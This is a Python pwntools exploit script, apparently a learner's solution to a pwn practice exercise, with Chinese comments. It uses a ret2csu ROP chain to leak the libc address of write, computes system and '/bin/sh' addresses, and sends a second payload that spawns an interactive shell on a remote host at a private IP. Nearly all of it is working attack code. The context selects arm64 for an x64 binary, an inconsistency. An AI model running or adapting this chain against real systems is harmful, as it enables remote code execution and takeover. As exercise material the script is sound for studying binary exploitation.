'''
Author: 白银
Date: 2022-12-16 18:36:47
LastEditTime: 2023-01-02 13:47:31
LastEditors: 白银
Description: 
Attention: 
FilePath: /pwn/question_5_plus_x64.py
'''
'''
Author: 白银
Date: 2022-12-16 18:36:47
LastEditTime: 2023-01-01 16:15:23
LastEditors: 白银
Description: gcc question_5_plus.c -fno-stack-protector -no-pie -o question_5_plus_x64  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=803.0&p=22
Attention: ret2csu
FilePath: /pwn/question_5_plus_x64.py
'''

from LibcSearcher import*
from pwn import *

set_arch = 1

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_5_plus_x64'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

'''
开始准备布置栈帧
'''
padding = 0x10  # ida看，buf和r差多少
return_addr = 0x401132  # p &dofunc，因为没有func
deadbeef = 0xdeadbeef  # func的返回地址，随意
# bin_sh_addr = 0x804c018  # search "/bin/sh"
write_sym = 0x404018  # ida跳转到.got.plt段里面找write
leak_func_got = 0x404018  # ida找_write，看jmp到哪，进去找write
# ROPgadget --binary question_5_plus_x64 --only "pop|ret"的0x00000000004006a3 : pop rdi ; ret
pop_rdi_ret = 0x4011fb
# pop_rsi_r15_ret = 0x4006a1  # 0x00000000004006a1 : pop rsi ; pop r15 ; ret

pop_rbx_addr = 0x4011F2  # ida找__libc_csu_init函数，直接往下找到pop rbx
rbx = 0
rbp = 1

r12 = 1  # ida找__libc_csu_init函数，直接往下找到mov edi r多少d，这里r12在最下
r13 = leak_func_got  # ida找__libc_csu_init函数，直接往下找到mov rsi r多少，这里r13在中间
r14 = 6  # ida找__libc_csu_init函数，直接往下找到mov rdx r多少，这里r14在最上
# 这里的r多少是ida找__libc_csu_init函数，直接往下找到call ds:(__frame_dummy_init_array_entry - 一个地址)[r多少+rbx*8]的r多少，这里是r15
r15 = write_sym
mov_rdx_r14_addr = 0x4011D8  # ida找__libc_csu_init函数，直接往下找到mov rdx, r多少，看左边地址，这里是r14

payload = flat(['a' * padding, pop_rbx_addr, rbx, rbp, r12, r13, r14, r15, mov_rdx_r14_addr])
payload += flat([deadbeef, deadbeef, deadbeef, deadbeef,
                deadbeef, deadbeef, deadbeef, return_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.recvuntil(b'bye')


write_addr = u64(io.recv(6).ljust(8, b'\x00'))
print('write_addr:', hex(write_addr))

write_offset = 0xEC820  # vmmap找用的libc，ida打开，找write，直接左边的地址，即偏移地址
libc_addr = write_addr - write_offset  # 算基地址
print('libc_addr:', hex(libc_addr))

system_offset = 0x45E50 # vmmap找用的libc，ida打开，找system，直接左边的地址，即偏移地址
system_addr = libc_addr + system_offset  # 算system地址
print('system_addr:', hex(system_addr))

bin_ssh_offset = 0x196152 # vmmap找用的libc，ida打开，shift+f12找/bin/sh，直接左边的地址，即偏移地址
bin_ssh_addr = libc_addr + bin_ssh_offset  # /bin/sh
print('bin_ssh_addr:', hex(bin_ssh_addr))


'''
经历以上，会返回主程序再接收input，需要再来一次
'''
'''
libc_base = LibcSearcher('write', write_sym)
write_offset = libc_base.dump("write")
system_offset = libc_base.dump("system")
bin_ssh_offset = libc_base.dump("str_bin_sh")
system_addr = write_sym - (write_offset - system_offset)
bin_ssh_addr = write_sym - (write_offset - bin_ssh_offset)
# system_addr, bin_ssh_addr = LibcSearcher('write', write_sym)
'''

payload2 = flat(['a' * padding, pop_rdi_ret, bin_ssh_addr, system_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload2)  # 远程用
else:
    io.sendlineafter(delimiter, payload2)  # 本地用

io.interactive()
